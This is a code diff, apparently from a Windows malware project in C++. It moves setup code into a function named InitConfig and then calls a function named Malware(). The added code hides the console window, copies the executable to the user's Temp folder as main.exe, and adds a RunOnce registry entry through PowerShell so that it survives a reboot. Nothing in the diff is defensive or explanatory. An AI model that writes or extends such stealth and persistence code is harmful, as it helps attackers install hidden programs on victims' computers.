@@ -140,25 +140,26 @@ string current_working_directory()
   free(cwd) ;
   return working_directory ;
 }
+void InitConfig(string programName)
+{
+  HWND window;
+  AllocConsole();
+  window = FindWindowA("ConsoleWindowClass", NULL);
+  ShowWindow(window,0);
+  char username[UNLEN+1];
+  DWORD username_len = UNLEN+1;
+  GetUserName(username, &username_len);
+  string pathUsers = "C:\\Users\\";
+  string pathTarget = "\\appdata\\local\\temp\\main.exe";
+  string input = current_working_directory()+"\\"+programName;
+  string output = pathUsers+username+pathTarget;
+  CopyFile(input.c_str(),output.c_str(), TRUE);
+  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+" -force";
+  system(commandPowerShell.c_str());
+}
 int main(int argc,char *argv[])
 {
-    HWND window;
-    AllocConsole();
-    window = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(window,0);
-    char username[UNLEN+1];
-    DWORD username_len = UNLEN+1;
-    GetUserName(username, &username_len);
-    string programName = argv[0];
-    string pathUsers = "C:\\Users\\";
-    string pathTarget = "\\appdata\\local\\temp\\main.exe";
-    string input = current_working_directory()+"\\"+programName;
-    string output = pathUsers+username+pathTarget;
-    CopyFile(input.c_str(),output.c_str(), TRUE);
-    string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+" -force";
-    system(commandPowerShell.c_str());
-
+    InitConfig(argv[0]);
     Malware();
-
     return 0;
 }
